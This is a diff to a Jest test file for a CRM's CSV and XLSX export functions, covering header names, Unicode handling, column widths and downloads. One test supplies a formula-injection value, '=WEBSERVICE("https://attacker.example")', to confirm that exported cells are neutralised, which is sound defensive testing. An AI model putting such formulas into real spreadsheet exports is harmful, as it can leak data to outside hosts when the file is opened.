@@ -8,12 +8,40 @@ import {
   displayedExportProgress,
   generateCsv,
 } from '@/object-record/record-index/export/hooks/useRecordIndexExportRecords';
+import {
+  XLSX_COLUMN_WIDTH_MAX,
+  XLSX_COLUMN_WIDTH_MIN,
+  XLSX_MIME_TYPE,
+  generateXlsx,
+  getSpreadsheetExportColumnWidths,
+  xlsxDownloader,
+} from '@/spreadsheet/utils/generateXlsxExport';
+import { getSpreadsheetExportColumnDefinitions } from '@/spreadsheet/utils/getSpreadsheetExportColumnDefinitions';
+import { unzipSync } from 'fflate';
 import { saveAs } from 'file-saver';
 import { read } from 'xlsx-ugnis';
 import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';
 
 jest.mock('file-saver', () => ({
   saveAs: jest.fn(),
+}));
+
+jest.mock(
+  '@/object-record/object-options-dropdown/hooks/useExportProcessRecordsForCSV',
+  () => ({
+    useExportProcessRecordsForCSV: jest.fn(),
+  }),
+);
+
+jest.mock(
+  '@/object-record/record-index/export/hooks/useRecordIndexLazyFetchRecords',
+  () => ({
+    useRecordIndexLazyFetchRecords: jest.fn(),
+  }),
+);
+
+jest.mock('twenty-shared/utils', () => ({
+  isDefined: (value: unknown) => value !== undefined && value !== null,
 }));
 
 jest.useFakeTimers();
@@ -73,10 +101,31 @@ describe('generateCsv', () => {
     expect(csv).toEqual(
       [
         '\uFEFFsep=,',
-        'Id,Foo,Empty,Nested link field / Link Label,Nested link field / Link URL,Nested link field / Secondary Links,Relation,Relation / ID',
+        'Record ID,Foo,Empty,Link label,Link URL,Additional Links,Relation,ID of Relation',
         '1,some field,,,https://www.test.com,"secondary link 1: https://www.test.com\nsecondary link 2: https://www.test.com",a relation,relation-uuid',
       ].join('\r\n'),
     );
+  });
+
+  it('preserves long numeric identifiers as text in CSV output', () => {
+    const columns: Pick<
+      ColumnDefinition<FieldMetadata>,
+      'size' | 'label' | 'type' | 'metadata'
+    >[] = [
+      {
+        label: 'External ID',
+        size: 120,
+        type: FieldMetadataType.TEXT,
+        metadata: { fieldName: 'externalId' },
+      },
+    ];
+
+    const csv = generateCsv({
+      columns,
+      rows: [{ id: '1', externalId: '1234567890123456' }],
+    });
+
+    expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}1234567890123456`);
   });
 
   it('writes Excel-readable CSV that the importer maps back without losing text or IDs', () => {
@@ -173,23 +222,23 @@ describe('generateCsv', () => {
 
     expect(mapWorkbook(workbook)).toEqual([
       [
-        'Id',
+        'Record ID',
         'Name',
         'Notes',
         'Company',
-        'Company / ID',
-        'Annual Revenue / Amount',
-        'Annual Revenue / Currency',
-        'Headquarters / Address 1',
-        'Headquarters / Address 2',
-        'Headquarters / City',
-        'Headquarters / State',
-        'Headquarters / Country',
-        'Headquarters / Post Code',
-        'Headquarters / Latitude',
-        'Headquarters / Longitude',
-        'Contact Name / First Name',
-        'Contact Name / Last Name',
+        'ID of Company',
+        'Amount',
+        'Currency',
+        'Address',
+        'Address 2',
+        'City',
+        'State',
+        'Country',
+        'Postcode',
+        'Latitude',
+        'Longitude',
+        'First Name',
+        'Last Name',
         'Created On',
         'Last Update',
       ],
@@ -264,7 +313,7 @@ describe('generateCsv', () => {
     expect(csv).toContain('PARTNER');
     expect(csv).toContain('"Python\nDjango"');
 
-    expect(csv).toContain('Id,Name,Tags,Skills');
+    expect(csv).toContain('Record ID,Name,Tags,Skills');
     expect(csv).toContain('1,John Doe');
     expect(csv).toContain('2,Jane Smith');
   });
@@ -305,7 +354,7 @@ describe('generateCsv', () => {
 
     const csv = generateCsv({ columns, rows });
 
-    expect(csv).toContain('Id,Name,Tags,Skills');
+    expect(csv).toContain('Record ID,Name,Tags,Skills');
     expect(csv).toContain('1,John Doe,,');
   });
 
@@ -579,6 +628,279 @@ describe('generateCsv', () => {
   });
 });
 
+describe('generateXlsx', () => {
+  const getWorksheetXml = (bytes: Uint8Array): string => {
+    const entries = unzipSync(bytes);
+    const worksheetPath = Object.keys(entries).find((path) =>
+      /^xl\/worksheets\/sheet\d+\.xml$/.test(path),
+    );
+
+    if (!worksheetPath) {
+      throw new Error('Generated workbook worksheet was not found');
+    }
+
+    return new TextDecoder().decode(entries[worksheetPath]);
+  };
+
+  it('generates a valid workbook with the shared flattened export contract', () => {
+    const columns = getSpreadsheetExportColumnDefinitions([
+      {
+        id: 'name-field',
+        name: 'name',
+        label: 'Name',
+        type: FieldMetadataType.TEXT,
+      },
+      {
+        id: 'company-field',
+        name: 'company',
+        label: 'Company',
+        type: FieldMetadataType.RELATION,
+        relation: { type: RelationType.MANY_TO_ONE },
+      },
+      {
+        id: 'person-name-field',
+        name: 'personName',
+        label: 'Person name',
+        type: FieldMetadataType.FULL_NAME,
+      },
+      {
+        id: 'address-field',
+        name: 'address',
+        label: 'Address',
+        type: FieldMetadataType.ADDRESS,
+      },
+      {
+        id: 'amount-field',
+        name: 'amount',
+        label: 'Amount',
+        type: FieldMetadataType.CURRENCY,
+      },
+      {
+        id: 'website-field',
+        name: 'website',
+        label: 'Website',
+        type: FieldMetadataType.LINKS,
+      },
+    ]);
+    const rows = [
+      {
+        id: 'record-1',
+        name: 'Élodie',
+        company: 'Acme',
+        companyId: 'company-1',
+        personName: { firstName: 'Élodie', lastName: 'Ben Salem' },
+        address: {
+          addressStreet1: '1 Rue de la Paix',
+          addressPostcode: '00123',
+        },
+        amount: { amountMicros: 1234.5, currencyCode: 'EUR' },
+        website: {
+          primaryLinkLabel: 'Site',
+          primaryLinkUrl: 'https://example.com',
+          secondaryLinks: 'LinkedIn: https://linkedin.com',
+        },
+      },
+    ];
+
+    const workbookBytes = generateXlsx({ columns, rows });
+    const workbook = read(workbookBytes, { type: 'array', dense: true });
+    const csvWorkbook = read(
+      new TextEncoder().encode(generateCsv({ columns, rows })),
+      { type: 'array', codepage: 65001, raw: true },
+    );
+
+    expect(workbook.SheetNames).toEqual(['Export']);
+    const mappedWorkbook = mapWorkbook(workbook);
+
+    expect(mapWorkbook(csvWorkbook)[0]).toEqual(mappedWorkbook[0]);
+    expect(mappedWorkbook).toEqual([
+      [
+        'Record ID',
+        'Name',
+        'Company',
+        'ID of Company',
+        'First Name',
+        'Last Name',
+        'Address',
+        'Address 2',
+        'City',
+        'State',
+        'Country',
+        'Postcode',
+        'Latitude',
+        'Longitude',
+        'Amount',
+        'Currency',
+        'Link label',
+        'Link URL',
+        'Additional Links',
+      ],
+      [
+        'record-1',
+        'Élodie',
+        'Acme',
+        'company-1',
+        'Élodie',
+        'Ben Salem',
+        '1 Rue de la Paix',
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        '00123',
+        undefined,
+        undefined,
+        '1234.5',
+        'EUR',
+        'Site',
+        'https://example.com',
+        'LinkedIn: https://linkedin.com',
+      ],
+    ]);
+
+    const worksheetXml = getWorksheetXml(workbookBytes);
+    expect(worksheetXml).toContain(
+      '<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>',
+    );
+    expect(worksheetXml).toContain('<autoFilter ref="A1:S2"/>');
+  });
+
+  it('preserves localized and custom Unicode headers natively', () => {
+    const columns = getSpreadsheetExportColumnDefinitions([
+      {
+        id: 'owner-field',
+        name: 'owner',
+        label: 'Propriétaire du compte',
+        type: FieldMetadataType.TEXT,
+      },
+      {
+        id: 'tax-number-field',
+        name: 'taxNumber',
+        label: 'Numéro fiscal',
+        type: FieldMetadataType.TEXT,
+      },
+    ]);
+    const workbook = read(
+      generateXlsx({
+        columns,
+        rows: [
+          {
+            id: 'record-1',
+            owner: 'Équipe',
+            taxNumber: 'TN-001',
+          },
+        ],
+      }),
+      { type: 'array', dense: true },
+    );
+
+    expect(mapWorkbook(workbook)[0]).toEqual([
+      'Record ID',
+      'Propriétaire du compte',
+      'Numéro fiscal',
+    ]);
+  });
+
+  it('keeps identifiers and formula-like text safe in XLSX cells', () => {
+    const columns = getSpreadsheetExportColumnDefinitions([
+      {
+        id: 'external-id-field',
+        name: 'externalId',
+        label: 'External ID',
+        type: FieldMetadataType.TEXT,
+      },
+      {
+        id: 'formula-field',
+        name: 'formula',
+        label: 'Formula',
+        type: FieldMetadataType.TEXT,
+      },
+    ]);
+    const workbookBytes = generateXlsx({
+      columns,
+      rows: [
+        {
+          id: 'record-1',
+          externalId: '001234567890123456',
+          formula: '=WEBSERVICE("https://attacker.example")',
+        },
+      ],
+    });
+    const workbook = read(workbookBytes, { type: 'array', dense: true });
+    const mappedWorkbook = mapWorkbook(workbook);
+
+    expect(mappedWorkbook[1]).toEqual([
+      'record-1',
+      '001234567890123456',
+      '=WEBSERVICE("https://attacker.example")',
+    ]);
+    expect(getWorksheetXml(workbookBytes)).toContain(
+      `\u200d=WEBSERVICE(&quot;https://attacker.example&quot;)`,
+    );
+  });
+
+  it('uses deterministic bounded widths based on headers and values', () => {
+    const columns = getSpreadsheetExportColumnDefinitions([
+      {
+        id: 'short-field',
+        name: 'short',
+        label: 'Short',
+        type: FieldMetadataType.TEXT,
+      },
+      {
+        id: 'long-field',
+        name: 'long',
+        label: 'A very long metadata header that should be bounded',
+        type: FieldMetadataType.TEXT,
+      },
+    ]);
+    const rows = [
+      {
+        id: 'record-1',
+        short: 'value',
+        long: 'x'.repeat(200),
+      },
+    ];
+
+    const widths = getSpreadsheetExportColumnWidths(columns, rows);
+
+    expect(widths).toHaveLength(3);
+    expect(widths.every((width) => width >= XLSX_COLUMN_WIDTH_MIN)).toBe(true);
+    expect(widths.every((width) => width <= XLSX_COLUMN_WIDTH_MAX)).toBe(true);
+    expect(widths[0]).toBe(11);
+    expect(widths[2]).toBe(XLSX_COLUMN_WIDTH_MAX);
+  });
+});
+
+describe('xlsxDownloader', () => {
+  const mockSaveAs = saveAs as jest.MockedFunction<typeof saveAs>;
+
+  beforeEach(() => {
+    mockSaveAs.mockClear();
+  });
+
+  it('downloads an XLSX blob with the native workbook MIME type', () => {
+    const columns = getSpreadsheetExportColumnDefinitions([
+      {
+        id: 'name-field',
+        name: 'name',
+        label: 'Name',
+        type: FieldMetadataType.TEXT,
+      },
+    ]);
+
+    xlsxDownloader('export.xlsx', {
+      columns,
+      rows: [{ id: 'record-1', name: 'Name' }],
+    });
+
+    const [blob, filename] = mockSaveAs.mock.calls[0] as [Blob, string];
+
+    expect(filename).toBe('export.xlsx');
+    expect(blob.type).toBe(XLSX_MIME_TYPE);
+  });
+});
+
 describe('csvDownloader', () => {
   const mockSaveAs = saveAs as jest.MockedFunction<typeof saveAs>;
 
@@ -632,6 +954,33 @@ describe('csvDownloader', () => {
     const text = Buffer.from(await readBlob(blob)).toString('utf-8');
 
     expect(text).toContain(name);
+  });
+
+  it('emits the downloaded Blob as one UTF-8 byte sequence', async () => {
+    csvDownloader('export.csv', {
+      columns: [
+        {
+          label: 'Propriétaire',
+          type: FieldMetadataType.TEXT,
+          metadata: { fieldName: 'owner' },
+        },
+      ],
+      rows: [{ id: '1', owner: 'Créé par' }],
+    });
+
+    const blob = mockSaveAs.mock.calls[0][0] as Blob;
+    const bytes = new Uint8Array(await readBlob(blob));
+    const expectedPrefix = new TextEncoder().encode(
+      '\uFEFFsep=,\r\nRecord ID,Propriétaire',
+    );
+    const text = new TextDecoder('utf-8').decode(bytes);
+
+    expect(blob.type).toBe('text/csv;charset=utf-8');
+    expect(Array.from(bytes.slice(0, expectedPrefix.length))).toEqual(
+      Array.from(expectedPrefix),
+    );
+    expect(text).toContain('Record ID,Propriétaire');
+    expect(text).not.toContain('Ã');
   });
 });
 
